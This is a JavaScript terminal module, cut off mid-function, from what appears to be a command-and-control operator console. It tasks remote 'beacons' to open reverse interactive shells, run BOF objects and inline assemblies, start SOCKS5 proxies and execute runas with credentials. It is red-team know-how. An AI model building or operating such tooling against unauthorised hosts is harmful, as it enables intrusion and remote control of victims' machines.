// terminal.js — xterm, input, commands, tabs, session/shell mode

// ---- Session WebSocket ----

async function connectSessionWs(bid) {
    if (sessionWs) { sessionWs.close(); sessionWs = null; }
    let url;
    try {
        url = await makeWebSocketURL('/ws/session/' + bid);
    } catch (_) {
        return;
    }
    sessionWs = new WebSocket(url);

    sessionWs.onmessage = function(event) {
        try {
            const data = JSON.parse(event.data);
            // File browser intercept + buffering
            if (data.label != null && _pendingFileBrowserTasks[data.label]) {
                _fbHandleResult(data);
                return;
            }
            if (data.label != null && _fbRegistering > 0) {
                _fbResultBuffer.push(data);
                return;
            }
            if (data.output) {
                appendLine(data.output, 'out');
                if (_pendingTasks[beaconId] > 0) _pendingTasks[beaconId]--;
                _writePrompt();
            }
        } catch (e) { /* ignore parse errors */ }
    };

    sessionWs.onclose = function() {
        sessionWs = null;
    };

    sessionWs.onerror = function() {
        if (sessionWs) { sessionWs.close(); sessionWs = null; }
    };
}

// ---- Session mode modal ----

let _sessionTargetId = null;

function showShellModal(bid, hostname) {
    _sessionTargetId = bid;
    const el = document.getElementById('session-modal-target');
    if (el) el.textContent = hostname || ('beacon #' + bid);
    const modal = document.getElementById('session-modal');
    if (modal) modal.style.display = 'flex';
}

function showSessionModal(bid, hostname) { showShellModal(bid, hostname); }

function cancelSession() {
    _sessionTargetId = null;
    const modal = document.getElementById('session-modal');
    if (modal) modal.style.display = 'none';
}

function confirmSession() {
    const bid = _sessionTargetId;
    cancelSession();
    if (bid == null) return;
    requestInteractive(bid);
}

async function closeSession(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/session/' + bid, { method: 'DELETE' });
        if (!resp.ok) {
            const txt = await resp.text();
            appendLine('[!] ' + txt, 'err');
        }
    } catch (e) { /* ignore */ }
}

async function requestInteractive(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return false;
    try {
        const resp = await authFetch(tsUrl + '/api/interactive', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ beacon_id: bid, port: 4443 })
        });
        if (resp.ok) {
            appendLine(PROMPT_STR + 'interactive', 'cmd-echo');
            appendLine('[*] interactive session requested — beacon will connect on next checkin', 'info');
            return true;
        } else {
            const txt = await resp.text();
            appendLine('[!] ' + txt, 'err');
            return false;
        }
    } catch (e) {
        appendLine('[!] interactive request error: ' + e.message, 'err');
        return false;
    }
}

function stopShell(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    authFetch(tsUrl + '/api/task', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ beacon_id: bid, type: 24, code: 0, args: '' })
    }).catch(function(){});
    _activeShells.delete(bid);
    const entry = _shellWsMap.get(bid);
    if (entry && entry.ws) { entry.ws.close(); }
    _shellWsMap.delete(bid);
    const tabKey = 'shell_' + bid;
    if (_openTabs.has(tabKey)) {
        _openTabs.delete(tabKey);
        if (beaconId === tabKey) {
            beaconId = null;
            const shellEl = document.getElementById('shell-terminal');
            if (shellEl) shellEl.style.display = 'none';
        }
    }
    _renderTabs();
    _saveTabs();
}

// ---- Shell terminal ----

function openShellTerminal(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;

    const tabKey = 'shell_' + bid;

    // If shell tab already exists, just switch to it
    if (_openTabs.has(tabKey)) {
        _switchTab(tabKey);
        document.body.classList.add('panel-open');
        return;
    }

    // Save current beacon state
    _saveBeaconState(beaconId);

    // Create shell xterm if first time
    if (!_shellTerm) _initShellXterm();

    // Set active tab
    beaconId = tabKey;
    _activeShellBid = bid;

    // Show shell terminal, hide beacon terminal and file browser
    const termEl = document.getElementById('terminal');
    const shellEl = document.getElementById('shell-terminal');
    const fbEl = document.getElementById('file-browser');
    if (termEl) termEl.style.display = 'none';
    if (fbEl) fbEl.style.display = 'none';
    if (shellEl) shellEl.style.display = '';

    _shellTerm.clear();
    _shellTerm.write('\x1b[2J\x1b[H');

    document.body.classList.add('panel-open');

    if (sessionWs) { sessionWs.close(); sessionWs = null; }

    if (_activeShells.has(bid)) {
        // Reconnect to existing shell — skip mode detection, just open WebSocket
        const entry = _shellWsMap.get(bid);
        if (entry) { entry.localEcho = false; entry.modeSet = true; }
        _shellTerm.write('\x1b[90m[reconnecting to shell...]\x1b[0m\r\n');
        _connectShellWs(bid);
    } else {
        // First time — send TASK_SHELL_START
        authFetch(tsUrl + '/api/task', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ beacon_id: bid, type: 21, code: 0, args: '' })
        }).then(resp => {
            if (!resp.ok) {
                _shellTerm.write('\x1b[31m[failed to start shell]\x1b[0m\r\n');
                return;
            }
            _shellTerm.write('\r\n\x1b[33mConnection will be established on next callback...\x1b[0m\r\n');
            _activeShells.add(bid);
            _connectShellWs(bid);
        });
    }

    // Add tab
    _openTabs.set(tabKey, { hostname: 'SHELL', shellBid: bid });
    _fetchShellTabHostname(tabKey, bid);
    _renderTabs();
    _saveTabs();
    _shellTerm.focus();
}

function _initShellXterm() {
    let el = document.getElementById('shell-terminal');
    if (!el) {
        el = document.createElement('div');
        el.id = 'shell-terminal';
        el.style.display = 'none';
        const termEl = document.getElementById('terminal');
        if (termEl && termEl.parentNode) {
            termEl.parentNode.insertBefore(el, termEl.nextSibling);
        }
    }

    _shellTerm = new Terminal({
        fontFamily: "'JetBrains Mono', 'IBM Plex Mono', 'Cascadia Mono', 'Courier New', monospace",
        fontSize: 13, letterSpacing: 0.5, lineHeight: 1.4,
        cursorBlink: true, cursorStyle: 'block',
        scrollback: 5000, allowTransparency: true,
        convertEol: true,
        theme: {
            background: '#000000', foreground: '#d4d4d4',
            cursor: '#c84b31', cursorAccent: '#000000',
            selectionBackground: 'rgba(200,75,49,0.25)',
            black:'#000000', red:'#c84b31', green:'#4a90a4', yellow:'#ffb000',
            blue:'#4a90a4', magenta:'#c84b31', cyan:'#4a90a4', white:'#e8d5a3',
        },
    });

    _shellFit = new FitAddon.FitAddon();
    _shellTerm.loadAddon(_shellFit);
    _shellTerm.open(el);
    try { _shellFit.fit(); } catch(_) {}
    new ResizeObserver(() => { try { _shellFit.fit(); } catch(_) {} }).observe(el);

    _shellTerm.onData(function(data) {
        const entry = _shellWsMap.get(_activeShellBid);
        if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
            if (entry.localEcho) {
                _shellTerm.write(data);
                data = data.replace(/\r/g, '\r\n');
            }
            entry.ws.send(data);
        }
    });
}

async function _connectShellWs(bid) {
    const existing = _shellWsMap.get(bid);
    if (existing && existing.ws && existing.ws.readyState <= WebSocket.OPEN) return;

    let url;
    try {
        url = await makeWebSocketURL('/ws/shell/' + bid);
    } catch (_) {
        return;
    }
    const ws = new WebSocket(url);
    ws.binaryType = 'arraybuffer';

    const entry = { ws: ws, buffer: [], localEcho: false, modeSet: false };
    _shellWsMap.set(bid, entry);

    ws.onopen = function() {
        if (entry.modeSet && _shellTerm && _activeShellBid === bid) {
            _shellTerm.write('\x1b[32m[shell reconnected]\x1b[0m\r\n');
            ws.send('\r');
        }
        if (_shellTerm && _activeShellBid === bid) _shellTerm.focus();
    };

    ws.onmessage = function(event) {
        let data = event.data instanceof ArrayBuffer
            ? new TextDecoder().decode(event.data) : event.data;

        if (!entry.modeSet) {
            entry.modeSet = true;
            if (data.startsWith('[conpty]\n')) {
                entry.localEcho = false;
                data = data.slice(9);
            } else if (data.startsWith('[pipes]\n')) {
                entry.localEcho = true;
                data = data.slice(8);
            }
            if (!data) return;
        }

        if (_activeShellBid === bid && _shellTerm) {
            _shellTerm.write(data, function() { _shellTerm.scrollToBottom(); });
        } else {
            entry.buffer.push(data);
        }
    };

    ws.onclose = function() {
        _shellWsMap.delete(bid);
        if (_activeShellBid === bid && _shellTerm) {
            _shellTerm.write('\r\n\x1b[90m[shell disconnected — close tab or click SHELL to reopen]\x1b[0m\r\n');
        }
    };

    ws.onerror = function() {
        if (ws.readyState !== WebSocket.CLOSED) ws.close();
    };
}

async function _fetchShellTabHostname(tabKey, bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/sessions');
        const beacons = await resp.json();
        const b = beacons.find(x => x.id === bid);
        if (b && b.hostname) {
            const tab = _openTabs.get(tabKey);
            if (tab) { tab.hostname = b.hostname; _renderTabs(); _saveTabs(); }
        }
    } catch(_) {}
}

// ---- Terminal state variables ----

let cmdHistory   = [];
let historyIdx   = -1;
let pollSince        = 0;
let beaconId         = null;
const _pendingTasks  = {};
let _lastSeenPrev    = 0;

// Xterm state
let _term          = null;
let _fitAddon      = null;
let _inputBuf      = '';
let _cursorPos     = 0;
let _promptVisible = false;

// Per-beacon terminal history persistence (survives page navigation)
const _beaconStates = {};
let _outputLog = [];

// ---- Terminal persistence ----

async function _saveTerminalToServer(id) {
    if (id == null) return;
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    const persistId = _terminalPersistId(id);
    if (persistId == null || isNaN(persistId)) return;
    const state = _beaconStates[id] || _beaconStates[persistId] || {};
    let fileBrowser = state.fileBrowser || null;
    let sessionFileBrowser = state.sessionFileBrowser || null;
    if (typeof _fbSerializeForBeacon === 'function') {
        fileBrowser = _fbSerializeForBeacon(persistId, false) || fileBrowser;
        sessionFileBrowser = _fbSerializeForBeacon(persistId, true) || sessionFileBrowser;
    }
    try {
        await authFetch(tsUrl + '/api/terminal/' + persistId, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                output_log: state.outputLog || [],
                cmd_history: state.cmdHistory || [],
                poll_since: state.pollSince || 0,
                file_browser: fileBrowser,
                session_file_browser: sessionFileBrowser,
            }),
        });
    } catch (_) {}
}

async function _loadTerminalFromServer(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return null;
    const persistId = _terminalPersistId(id);
    if (persistId == null || isNaN(persistId)) return null;
    try {
        const resp = await authFetch(tsUrl + '/api/terminal/' + persistId);
        if (!resp.ok) return null;
        const state = await resp.json();
        if (!state) return null;
        return {
            outputLog: state.output_log || [],
            cmdHistory: state.cmd_history || [],
            pollSince: state.poll_since || 0,
            fileBrowser: state.file_browser || null,
            sessionFileBrowser: state.session_file_browser || null,
        };
    } catch (_) {
        return null;
    }
}

function _terminalPersistId(id) {
    if (id == null) return null;
    if (typeof id === 'string') {
        if (id.startsWith('fbs_')) return parseInt(id.slice(4), 10);
        if (id.startsWith('fb_')) return parseInt(id.slice(3), 10);
        if (id.startsWith('sess_')) return parseInt(id.slice(5), 10);
        if (id.startsWith('shell_')) return parseInt(id.slice(6), 10);
        return parseInt(id, 10);
    }
    return id;
}

function _saveTabs() {
    try {
        const tabs = [];
        for (const [id, tab] of _openTabs) {
            if (typeof id === 'string' && id.startsWith('shell_')) continue;
            const isFb = _isFbTab(id);
            tabs.push({ id, hostname: tab.hostname, type: isFb ? 'filebrowser' : undefined });
        }
        localStorage.setItem('bebop_tabs', JSON.stringify(tabs));
        const activeToSave = (typeof beaconId === 'string' && beaconId.startsWith('shell_')) ? '' : (beaconId != null ? String(beaconId) : '');
        localStorage.setItem('bebop_active', activeToSave);
        localStorage.setItem('bebop_panelOpen', document.body.classList.contains('panel-open') ? '1' : '0');
    } catch (_) {}
}

function _loadTabs() {
    try {
        const tabsRaw = localStorage.getItem('bebop_tabs');
        const activeRaw = localStorage.getItem('bebop_active');
        if (tabsRaw) {
            const tabs = JSON.parse(tabsRaw);
            for (const t of tabs) {
                _openTabs.set(t.id, { hostname: t.hostname });
                // Re-resolve stale/unknown hostnames from the current session list.
                const isShell = typeof t.id === 'string' && t.id.startsWith('shell_');
                const stale   = !t.hostname || t.hostname === '?' || (isShell && t.hostname === 'SHELL');
                if (stale) _fetchTabHostname(t.id);
            }
        }
        if (_openTabs.size > 0) {
            if (activeRaw) {
                let activeId;
                if (activeRaw.startsWith('fb_') || activeRaw.startsWith('fbs_') || activeRaw.startsWith('sess_')) {
                    activeId = activeRaw;
                } else {
                    activeId = parseInt(activeRaw, 10);
                }
                if (!isNaN(activeId) || typeof activeId === 'string') {
                    if (_openTabs.has(activeId)) return activeId;
                }
            }
            return _openTabs.keys().next().value;
        }
    } catch (_) {}
    return null;
}

let _serverSaveDirty = false;

setInterval(async () => {
    if (!_serverSaveDirty || beaconId == null) return;
    if (typeof beaconId === 'string' && (beaconId.startsWith('shell_') || _isFbTab(beaconId))) return;
    _beaconStates[beaconId] = {
        outputLog: _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince: pollSince,
    };
    _saveTerminalToServer(beaconId);
    _serverSaveDirty = false;
}, 2000);

function _saveBeaconState(id) {
    if (id == null || !_term) return;
    if (typeof id === 'string' && (id.startsWith('shell_') || _isFbTab(id))) return;
    _beaconStates[id] = {
        outputLog:  _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince:  pollSince,
    };
    _saveTerminalToServer(id);
    _saveTabs();
}

function _restoreBeaconState(id) {
    const state = _beaconStates[id];
    if (!state) return false;
    cmdHistory = state.cmdHistory.slice();
    pollSince  = state.pollSince;
    _outputLog = state.outputLog.slice();
    _promptVisible = false;
    _inputBuf = '';
    _cursorPos = 0;
    for (const entry of _outputLog) {
        _replayLine(entry.text, entry.cls);
    }
    return true;
}

function _replayLine(text, cls) {
    if (!_term) return;
    if (cls === 'cmd-echo') {
        _term.writeln(text + ANSI.reset);
        return;
    }
    const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trimEnd();
    if (!normalized.trim()) return;
    let color;
    switch (cls) {
        case 'err':  color = ANSI.red;              break;
        case 'hint': color = ANSI.dim + ANSI.amber; break;
        default:     color = ANSI.cream;             break;
    }
    const lines = normalized.split('\n');
    for (const line of lines) _term.writeln(color + line + ANSI.reset);
}

// ---- Xterm helpers ----

function _writePrompt() {
    if (_promptVisible) return;
    _promptVisible = true;
    _term.write(PROMPT_STR);
}

function _redrawTail() {
    const tail = _inputBuf.slice(_cursorPos);
    _term.write('\x1b[K' + tail);
    if (tail.length > 0) _term.write('\x1b[' + tail.length + 'D');
}

function _replaceBuffer(val) {
    if (_cursorPos > 0) _term.write('\x1b[' + _cursorPos + 'D');
    _term.write('\x1b[K' + val);
    _inputBuf  = val;
    _cursorPos = val.length;
}

function _tokenizeCommandLine(input) {
    const tokens = [];
    let current = '';
    let quote = '';
    let escape = false;

    for (let i = 0; i < input.length; i++) {
        const ch = input[i];

        if (escape) {
            current += ch;
            escape = false;
            continue;
        }

        if (ch === '\\' && quote) {
            const next = input[i + 1];
            if (next === quote || next === '\\') {
                escape = true;
                continue;
            }
        }

        if (quote) {
            if (ch === quote) {
                quote = '';
            } else {
                current += ch;
            }
            continue;
        }

        if (ch === '"' || ch === '\'') {
            quote = ch;
            continue;
        }

        if (/\s/.test(ch)) {
            if (current) {
                tokens.push(current);
                current = '';
            }
            continue;
        }

        current += ch;
    }

    if (current || quote) tokens.push(current);
    return tokens;
}

function _sliceArgsFromCommand(cmd, tokensConsumed) {
    let idx = 0;
    let seen = 0;

    while (idx < cmd.length && /\s/.test(cmd[idx])) idx++;
    while (idx < cmd.length && !/\s/.test(cmd[idx])) idx++;

    while (idx < cmd.length && seen < tokensConsumed) {
        while (idx < cmd.length && /\s/.test(cmd[idx])) idx++;
        if (idx >= cmd.length) break;

        const start = idx;
        let quote = '';
        let escape = false;

        while (idx < cmd.length) {
            const ch = cmd[idx];
            if (escape) {
                escape = false;
                idx++;
                continue;
            }
            if (ch === '\\' && quote) {
                const next = cmd[idx + 1];
                if (next === quote || next === '\\') {
                    escape = true;
                    idx++;
                    continue;
                }
            }
            if (quote) {
                if (ch === quote) quote = '';
                idx++;
                continue;
            }
            if (ch === '"' || ch === '\'') {
                quote = ch;
                idx++;
                continue;
            }
            if (/\s/.test(ch)) break;
            idx++;
        }

        if (idx === start) break;
        seen++;
    }

    while (idx < cmd.length && /\s/.test(cmd[idx])) idx++;
    return cmd.slice(idx);
}

function _parseInlineAssemblyInput(cmd, cmdArgs) {
    const tokens = _tokenizeCommandLine(cmdArgs);
    let idx = 0;
    let mode = 'auto';

    while (idx < tokens.length) {
        const token = tokens[idx];
        if (token === '--mode') {
            idx++;
            if (idx >= tokens.length) {
                throw new Error('usage: inline-assembly [--mode auto|bridge] [assembly] [args]');
            }
            mode = tokens[idx].toLowerCase();
            idx++;
            continue;
        }
        if (token.startsWith('--mode=')) {
            mode = token.slice(7).toLowerCase();
            idx++;
            continue;
        }
        break;
    }

    if (!['auto', 'bridge'].includes(mode)) {
        throw new Error('invalid mode: ' + mode + ' (expected auto or bridge)');
    }

    const assemblyName = idx < tokens.length ? tokens[idx] : '';
    const pickerArgs = _sliceArgsFromCommand(cmd, idx);
    const libraryArgs = assemblyName ? _sliceArgsFromCommand(cmd, idx + 1) : pickerArgs;

    return {
        mode: mode,
        assemblyName: assemblyName,
        pickerArgs: pickerArgs,
        libraryArgs: libraryArgs,
    };
}

function _formatInlineAssemblyOutput(result) {
    const lines = [
        '[inline-assembly]',
        'Exit: ' + String(result.exit_code != null ? result.exit_code : 0),
        'Duration: ' + String(result.duration_ms || 0) + 'ms',
        'Truncated: ' + String(!!result.truncated),
    ];

    if (result.truncated) {
        lines.push('');
        lines.push('[warning] output truncated');
    }

    const sections = [
        ['STDOUT', result.stdout],
        ['STDERR', result.stderr],
        ['EXCEPTION', result.exception],
        ['DIAGNOSTICS', result.diagnostics],
    ];

    for (const [name, value] of sections) {
        if (!value) continue;
        lines.push('');
        lines.push(name + ':');
        lines.push(value);
    }

    return lines.join('\n');
}

function _isInlineAssemblyResult(result) {
    if (!result || result.type !== 15) return false;
    return !!(
        result.mode ||
        result.stdout ||
        result.stderr ||
        result.exception ||
        result.diagnostics ||
        result.duration_ms ||
        result.exit_code
    );
}

async function queueBOFObjectFile(file, argsText) {
    const tsUrl = getTsUrl();
    if (!tsUrl) {
        appendLine('[error] teamserver URL not configured', 'err');
        return false;
    }
    if (beaconId === null || isNaN(_actualBid())) {
        appendLine('[error] select a beacon first', 'err');
        return false;
    }
    const target = _beacons[_actualBid()];
    if (target && target.platform === 0) {
        appendLine('[error] bof is Windows-only', 'err');
        return false;
    }
    if (!file) return false;

    const fd = new FormData();
    fd.append('beacon_id', String(_actualBid()));
    fd.append('object', file);
    fd.append('args', argsText || '');

    const r = await authFetch(tsUrl + '/api/bof', { method: 'POST', body: fd });
    if (!r.ok) {
        appendLine('[error] bof failed: ' + (await r.text()), 'err');
        return false;
    }
    const j = await r.json();
    if (j.label) _tabLabels[j.label] = beaconId;
    appendLine(`[*] bof queued (label: ${j.label}, object: ${j.obj_size} bytes)`, 'hint');
    _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
    return true;
}

async function queueBOFObjectName(name, argsText) {
    const tsUrl = getTsUrl();
    if (!tsUrl) {
        appendLine('[error] teamserver URL not configured', 'err');
        return false;
    }
    if (beaconId === null || isNaN(_actualBid())) {
        appendLine('[error] select a beacon first', 'err');
        return false;
    }
    const target = _beacons[_actualBid()];
    if (target && target.platform === 0) {
        appendLine('[error] bof-execute is Windows-only', 'err');
        return false;
    }
    const fd = new FormData();
    fd.append('beacon_id', String(_actualBid()));
    fd.append('object_name', name);
    fd.append('args', argsText || '');

    const r = await authFetch(tsUrl + '/api/bof', { method: 'POST', body: fd });
    if (!r.ok) {
        appendLine('[error] bof-execute failed: ' + (await r.text()), 'err');
        return false;
    }
    const j = await r.json();
    if (j.label) _tabLabels[j.label] = beaconId;
    appendLine(`[*] bof queued (label: ${j.label}, object: ${j.obj_size} bytes)`, 'hint');
    _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
    return true;
}

function openBOFPicker(argsText, restorePrompt) {
    let picker = document.getElementById('bof-picker');
    if (!picker) {
        picker = document.createElement('input');
        picker.type = 'file';
        picker.id = 'bof-picker';
        picker.accept = '.o,.obj';
        picker.style.display = 'none';
        document.body.appendChild(picker);
    }
    appendLine('[*] select BOF object file...', 'hint');
    picker.onchange = async () => {
        const file = picker.files[0];
        if (!file) {
            if (restorePrompt) _writePrompt();
            return;
        }
        try {
            await queueBOFObjectFile(file, argsText || '');
        } catch (e) {
            appendLine('[error] ' + e.message, 'err');
        } finally {
            picker.value = '';
            if (restorePrompt) _writePrompt();
        }
    };
    picker.click();
}

async function uploadBOFObjectFile(name, file) {
    const tsUrl = getTsUrl();
    if (!tsUrl) {
        appendLine('[error] teamserver URL not configured', 'err');
        return false;
    }
    const fd = new FormData();
    fd.append('name', name);
    fd.append('file', file);
    const r = await authFetch(tsUrl + '/api/library', { method: 'POST', body: fd });
    if (!r.ok) {
        appendLine('[error] bof-upload failed: ' + (await r.text()), 'err');
        return false;
    }
    const j = await r.json();
    appendLine(`[+] bof "${j.name}" uploaded (${j.size} bytes)`, 'hint');
    if (typeof loadLibraryPanel === 'function') loadLibraryPanel();
    return true;
}

function appendLine(text, cls) {
    if (!_term) return;
    const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trimEnd();
    if (!normalized.trim()) return;
    _serverSaveDirty = true;

    _outputLog.push({ text, cls });

    let color;
    switch (cls) {
        case 'cmd-echo': color = ANSI.cream;            break;
        case 'err':      color = ANSI.red;              break;
        case 'hint':     color = ANSI.dim + ANSI.amber; break;
        default:         color = ANSI.cream;            break;
    }

    const lines = normalized.split('\n');

    if (_promptVisible) {
        if (_cursorPos > 0) _term.write('\x1b[' + _cursorPos + 'D');
        _term.write('\r\x1b[K');
        for (const line of lines) _term.write(color + line + ANSI.reset + '\r\n');
        _term.write(PROMPT_STR + _inputBuf);
        if (_cursorPos < _inputBuf.length) {
            _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'D');
        }
    } else {
        for (const line of lines) _term.writeln(color + line + ANSI.reset);
    }

    if (cls !== 'cmd-echo' && text.trim()) {
        const orig = document.title.replace(/^\[★\] /, '');
        document.title = '[★] ' + orig;
        setTimeout(() => { document.title = orig; }, 4000);
    }
}

// ---- Tab completion ----

function _handleTab() {
    if (!_inputBuf) return;
    const word    = _inputBuf.split(/\s+/)[0].toLowerCase();
    const matches = VALID_COMMANDS.filter(c => c.startsWith(word));
    if (matches.length === 1) {
        const rest = _inputBuf.indexOf(' ') >= 0 ? _inputBuf.slice(_inputBuf.indexOf(' ')) : ' ';
        _replaceBuffer(matches[0] + rest);
    } else if (matches.length > 1) {
        _term.write('\r\n' + ANSI.dim + ANSI.amber + matches.join('   ') + ANSI.reset + '\r\n');
        _writePrompt();
        _term.write(_inputBuf);
        if (_cursorPos < _inputBuf.length) _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'D');
    }
}

// ---- Line input handler ----

function _handleData(data) {

    switch (data) {
        case '\x1b[A': // Arrow Up
            if (!cmdHistory.length) return;
            historyIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
            _replaceBuffer(cmdHistory[historyIdx] || '');
            return;
        case '\x1b[B': // Arrow Down
            historyIdx = Math.max(historyIdx - 1, -1);
            _replaceBuffer(historyIdx >= 0 ? cmdHistory[historyIdx] : '');
            return;
        case '\x1b[C': // Right
            if (_cursorPos < _inputBuf.length) { _cursorPos++; _term.write('\x1b[C'); }
            return;
        case '\x1b[D': // Left
            if (_cursorPos > 0) { _cursorPos--; _term.write('\x1b[D'); }
            return;
        case '\x01': case '\x1b[H': // Ctrl+A / Home
            if (_cursorPos > 0) { _term.write('\x1b[' + _cursorPos + 'D'); _cursorPos = 0; }
            return;
        case '\x05': case '\x1b[F': // Ctrl+E / End
            if (_cursorPos < _inputBuf.length) {
                _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'C');
                _cursorPos = _inputBuf.length;
            }
            return;
        case '\x7f': case '\b': // Backspace
            if (_cursorPos > 0) {
                _inputBuf  = _inputBuf.slice(0, _cursorPos - 1) + _inputBuf.slice(_cursorPos);
                _cursorPos--;
                _term.write('\b');
                _redrawTail();
            }
            return;
        case '\x1b[3~': // Delete
            if (_cursorPos < _inputBuf.length) {
                _inputBuf = _inputBuf.slice(0, _cursorPos) + _inputBuf.slice(_cursorPos + 1);
                _redrawTail();
            }
            return;
        case '\x15': // Ctrl+U — kill to start
            if (_cursorPos > 0) { _term.write('\x1b[' + _cursorPos + 'D'); _cursorPos = 0; }
            _inputBuf  = _inputBuf.slice(_cursorPos);
            _cursorPos = 0;
            _redrawTail();
            return;
        case '\x0b': // Ctrl+K — kill to end
            _inputBuf = _inputBuf.slice(0, _cursorPos);
            _term.write('\x1b[K');
            return;
        case '\x03': // Ctrl+C
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('^C\r\n');
            _writePrompt();
            return;
        case '\x0c': // Ctrl+L — clear screen + home, then fresh prompt
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _term.clear();
            _term.write('\x1b[2J\x1b[H');
            _writePrompt();
            return;
        case '\t':
            _handleTab();
            return;
        case '\r': case '\n': {
            const cmd  = _inputBuf.trim();
            _inputBuf  = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('\r\n');
            if (cmd) _processCommand(cmd);
            else     _writePrompt();
            return;
        }
    }
    // Filter to printable characters (handles both single keypress and multi-char paste)
    const printable = data.replace(/[\x00-\x1f\x7f]/g, '');
    if (printable.length > 0) {
        _inputBuf = _inputBuf.slice(0, _cursorPos) + printable + _inputBuf.slice(_cursorPos);
        _cursorPos += printable.length;
        _term.write(printable);
        if (_cursorPos < _inputBuf.length) {
            const tail = _inputBuf.slice(_cursorPos);
            _term.write(tail + '\x1b[' + tail.length + 'D');
        }
    }
}

// ---- Command dispatch ----

async function _processCommand(cmd) {
    const baseCmd = cmd.split(/\s+/)[0].toLowerCase();
    cmdHistory.unshift(cmd);
    if (cmdHistory.length > 100) cmdHistory.pop();
    historyIdx = -1;

    _outputLog.push({ text: PROMPT_STR + cmd, cls: 'cmd-echo' });
    _beaconStates[beaconId] = {
        outputLog: _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince: pollSince,
    };
    _saveTerminalToServer(beaconId);
    _serverSaveDirty = false;

    if (cmd === 'help') {
        const b = _beacons[_actualBid()];
        const ht = (b && b.platform === 0) ? HELP_TEXT_LINUX : HELP_TEXT;
        ht.forEach(line => appendLine(line, 'output'));
        _writePrompt();
        return;
    }

    if (cmd === 'clear') {
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _term.clear();
        _term.write('\x1b[2J\x1b[H');
        _writePrompt();
        return;
    }

    const _curBeacon = _beacons[_actualBid()];
    const _isLinux = _curBeacon && _curBeacon.platform === 0;
    if (!(_isLinux ? VALID_COMMANDS_LINUX : VALID_COMMANDS).includes(baseCmd)) {
        appendLine(`[error] unknown command: "${baseCmd}". type "help" for a list of valid commands.`, 'err');
        _writePrompt();
        return;
    }

    const cmdArgs = cmd.slice(baseCmd.length).trim();
    const NEEDS_ARGS = {
        cd:        '<path>',
        cat:       '<file>',
        stat:      '<path>',
        mkdir:     '<path>',
        rm:        '<file>',
        rmdir:     '<path>',
        cp:        '<src> <dst>',
        mv:        '<src> <dst>',
        kill:      '<pid>',
        dns:       '<hostname>',
        reg_query: '<HIVE\\key> <value>',
        reg_set:   '<HIVE\\key> <value> <data>',
        runas:     '<user> <pass> <cmd>',
        /* shell: no args = interactive shell, with args = cmd.exe /c */
        sleep:     '<seconds> [jitter%]',
        getenv:    '<name>',
        'assembly-upload': '<name>',
        'assembly-delete': '<name>',
        'bof-upload': '<name.o|name.obj>',
    };
    if (NEEDS_ARGS[baseCmd] && !cmdArgs) {
        // cd without args is valid on Linux (goes to $HOME)
        if (_isLinux && baseCmd === 'cd') {
            // allow through
        } else {
            appendLine('[error] usage: ' + baseCmd + ' ' + NEEDS_ARGS[baseCmd], 'err');
            _writePrompt();
            return;
        }
    }
    if (baseCmd === 'kill') {
        const pid = parseInt(cmdArgs, 10);
        if (isNaN(pid) || pid <= 0) {
            appendLine('[error] kill requires a valid PID (number > 0)', 'err');
            _writePrompt(); return;
        }
    }
    if ((baseCmd === 'cp' || baseCmd === 'mv') && cmdArgs.split(/\s+/).length < 2) {
        appendLine('[error] usage: ' + baseCmd + ' <src> <dst>', 'err');
        _writePrompt(); return;
    }
    if (baseCmd === 'runas' && cmdArgs.split(/\s+/).length < 3) {
        appendLine('[error] usage: runas <user> <pass> <cmd>', 'err');
        _writePrompt(); return;
    }

    const tsUrl = getTsUrl();
    if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }
    if (beaconId === null || isNaN(_actualBid())) {
        appendLine('[error] no beacon selected', 'err'); _writePrompt(); return;
    }

    // ---- Interactive session upgrade ----

    if (baseCmd === 'interactive') {
        showShellModal(_actualBid(), '');
        _writePrompt();
        return;
    }

    if (baseCmd === 'shell' && !cmdArgs) {
        if (_beaconModes[_actualBid()] !== 'session') {
            appendLine('[!] shell requires session mode — type "interactive" first', 'err');
        } else {
            openShellTerminal(_actualBid());
        }
        _writePrompt();
        return;
    }

    // ---- SOCKS5 proxy control ----

    if (baseCmd === 'socks5') {
        if (_beaconModes[_actualBid()] !== 'session') {
            appendLine('[!] socks5 requires session mode — type "interactive" first', 'err');
            _writePrompt();
            return;
        }

        const subArgs = cmdArgs.trim().split(/\s+/);
        const subCmd  = subArgs[0] ? subArgs[0].toLowerCase() : '';

        if (subCmd !== 'start' && subCmd !== 'stop') {
            appendLine('[error] usage: socks5 start [port] | socks5 stop', 'err');
            _writePrompt();
            return;
        }

        if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }

        if (subCmd === 'start') {
            const body = { beacon_id: _actualBid() };
            if (subArgs[1]) {
                const p = parseInt(subArgs[1], 10);
                if (isNaN(p) || p < 1 || p > 65535) {
